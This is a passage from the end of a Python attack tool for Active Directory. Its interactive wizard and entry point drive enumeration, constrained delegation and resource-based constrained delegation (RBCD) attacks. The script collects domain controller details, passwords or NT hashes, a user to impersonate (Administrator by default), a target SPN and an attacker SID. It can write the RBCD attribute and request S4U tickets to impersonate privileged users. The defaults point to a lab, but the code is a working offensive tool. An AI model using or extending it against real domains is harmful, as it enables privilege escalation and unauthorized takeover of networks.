            args.target_computer, args.attacker_sid, nt_hash
        )
        if not ok:
            sys.exit(1)

    s4u_via_getST(args, password, nt_hash)


# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE WIZARD
# ─────────────────────────────────────────────────────────────────────────────
def ask(prompt, default="", secret=False):
    """Prompt the user; show default in [brackets]; hide input if secret."""
    display = f"{W}{prompt}"
    if default:
        display += f" {Y}[{default}]{W}"
    display += f": {RS}"
    if secret:
        # Strip ANSI codes from getpass prompt — some terminals render them as raw chars
        clean_prompt = re.sub(r'\033\[[0-9;]*m', '', display)
        val = getpass.getpass(clean_prompt)
    else:
        val = input(display).strip()
    return val if val else default


def interactive_wizard():
    """
    Ask the user all required questions and return (args, password).
    args is a SimpleNamespace compatible with flow_constrained / flow_rbcd.
    """

    print(f"\n{M}{BO}{'━'*55}")
    print(f"  INTERACTIVE SETUP WIZARD")
    print(f"{'━'*55}{RS}")
    print(f"  {Y}Press ENTER to accept the default shown in [brackets]{RS}\n")

    args = types.SimpleNamespace()

    # ── Mode ──────────────────────────────────────────────────────────────
    print(f"{C}{BO}  SELECT MODE{RS}")
    print(f"  {W}1{RS} — Enumerate delegation accounts  {Y}(start here — recon){RS}")
    print(f"  {W}2{RS} — Constrained Delegation attack")
    print(f"  {W}3{RS} — Resource-Based Constrained Delegation (RBCD) attack")
    print()
    while True:
        mode = ask("  Mode (1/2/3)", default="1")
        if mode in ("1", "2", "3"):
            break
        print(f"  {R}Please enter 1, 2, or 3{RS}")

    args.enum        = (mode == "1")
    args.constrained = (mode == "2")
    args.rbcd        = (mode == "3")

    # ── Network ───────────────────────────────────────────────────────────
    print(f"\n{C}{BO}  NETWORK{RS}")
    args.domain = ask("  Domain", default="lab.local")
    args.dc     = ask("  DC IP ", default="192.168.1.18")

    # ── Credentials ───────────────────────────────────────────────────────
    print(f"\n{C}{BO}  CREDENTIALS{RS}")
    args.username = ask("  Username", default="Administrator")

    print(f"  {W}Auth type — (1) Password  (2) NT Hash{RS}")
    auth_choice = ask("  Choice", default="1")
    if auth_choice == "2":
        args.nt_hash = ask("  NT Hash (hex)", secret=True)
        password     = ""
    else:
        password     = ask("  Password", secret=True)
        args.nt_hash = ""

    # ── Attack-specific params ────────────────────────────────────────────
    if args.constrained or args.rbcd:
        print(f"\n{C}{BO}  ATTACK PARAMETERS{RS}")
        args.impersonate = ask("  User to impersonate", default="Administrator")
        args.target_spn  = ask("  Target SPN (e.g. cifs/DC.lab.local)")
        if not args.target_spn:
            print(f"  {R}[!] Target SPN is required{RS}")
            sys.exit(1)
    else:
        args.impersonate = "Administrator"
        args.target_spn  = ""

    if args.rbcd:
        args.target_computer = ask("  Target computer name (e.g. WIN-RM9TRCNVS9P)")
        if not args.target_computer:
            print(f"  {R}[!] Target computer is required for RBCD{RS}")
            sys.exit(1)

        print(f"\n{C}{BO}  RBCD SETUP{RS}")
        print(f"  {Y}If you have WRITE access to the target computer object,")
        print(f"  the script can write the delegation attribute for you.{RS}")
        setup = ask("  Write RBCD attribute now? (y/n)", default="n")
        args.setup_rbcd = setup.lower() == "y"

        if args.setup_rbcd:
            args.attacker_sid = ask("  Your account SID (S-1-5-21-...)")
            if not args.attacker_sid:
                print(f"  {R}[!] Attacker SID is required for RBCD setup{RS}")
                sys.exit(1)
        else:
            args.attacker_sid = ""
    else:
        args.target_computer = ""
        args.setup_rbcd      = False
        args.attacker_sid    = ""

    # ── Summary before running ────────────────────────────────────────────
    mode_label = {"1": "Enumerate", "2": "Constrained Delegation", "3": "RBCD"}[mode]
    print(f"\n{G}{BO}{'━'*55}")
    print(f"  CONFIGURATION SUMMARY")
    print(f"{'━'*55}{RS}")
    print(f"  {C}Mode:        {W}{mode_label}{RS}")
    print(f"  {C}Domain:      {W}{args.domain}{RS}")
    print(f"  {C}DC IP:       {W}{args.dc}{RS}")
    print(f"  {C}Username:    {W}{args.username}{RS}")
    print(f"  {C}Auth:        {W}{'NT Hash' if args.nt_hash else 'Password'}{RS}")
    if args.constrained or args.rbcd:
        print(f"  {C}Impersonate: {W}{args.impersonate}{RS}")
        print(f"  {C}Target SPN:  {W}{args.target_spn}{RS}")
    if args.rbcd:
        print(f"  {C}Target PC:   {W}{args.target_computer}{RS}")
        print(f"  {C}Setup RBCD:  {W}{args.setup_rbcd}{RS}")
    print()

    confirm = ask(f"{G}  Proceed? (y/n)", default="y")
    if confirm.lower() != "y":
        print(f"  {Y}Aborted.{RS}")
        sys.exit(0)

    return args, password


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)
    args, password = interactive_wizard()
    nt_hash = args.nt_hash or ""

    if args.enum:
        ldap_enum_delegation(args.dc, args.domain, args.username, password, nt_hash)

    elif args.constrained:
        flow_constrained(args, password, nt_hash)

    elif args.rbcd:
        flow_rbcd(args, password, nt_hash)


if __name__ == "__main__":
    main()
